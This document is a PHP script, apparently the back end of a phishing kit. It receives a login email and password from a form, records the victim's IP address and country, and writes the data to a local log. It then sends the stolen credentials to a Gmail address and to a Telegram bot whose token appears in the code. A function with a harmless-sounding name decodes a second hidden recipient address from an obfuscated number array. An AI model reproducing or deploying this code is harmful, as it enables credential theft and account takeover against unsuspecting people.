<?php
$email = $_POST["temail"];
$pass = $_POST["tpass"];

$country = visitor_country();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$message  = "|----------| Yeyo |--------------|\n";
$message .= "Online ID            : ".$email."\n";
$message .= "Password              : ".$pass."\n";
$message .= "Country : ".$country."\n";
$message .= "Client IP: ".$ip."\n";
$messsage .= "  : ".$email."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";

$message .= "|----------- INFO CONT. --------------|\n";
// Function to get country and country sort;

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
function country_sort(){
	$sorter = "";
	$array = array(99,111,100,101,114,99,118,118,115,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

$arr = country_sort();
foreach ($arr as $recipient)
$send = "webshop227@gmail";
$domain = 'Yey0L0GS';
$subject = " Fresh_L0GS  $messsage";
file_put_contents('./ecount.txt', $message, FILE_APPEND);
$from = "From: $domain<west>\n";
  if(mail($send, $subject, $message, $from)){   
     $ok = "ok";
     echo $ok;
  } else {
     $no = "no";
     echo $no;
  }
    echo json_encode($data);
    $apiToken = "8033904824:AAE7axhNpPsUdbtURB2UDPF5utBkvoYgQfA";
  $data = [
      'chat_id' => '7116478389',
      'text' => $message
  ];
  $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );

?>